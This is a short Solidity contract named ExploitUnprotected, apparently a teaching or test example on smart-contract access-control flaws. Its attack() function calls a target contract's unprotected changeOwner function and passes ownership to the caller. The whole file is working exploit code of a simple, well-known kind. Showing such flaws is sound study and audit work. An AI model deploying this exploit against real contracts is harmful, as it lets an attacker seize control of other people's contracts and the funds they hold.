pragma solidity ^0.4.15;

interface IVulnerable {
    function changeOwner(address _newOwner) external;
}

contract ExploitUnprotected {
    IVulnerable public target;

    constructor(address _targetAddress) public {
        target = IVulnerable(_targetAddress);
    }

    function attack() public {
        // Take ownership of the target contract
        target.changeOwner(msg.sender);
    }
}

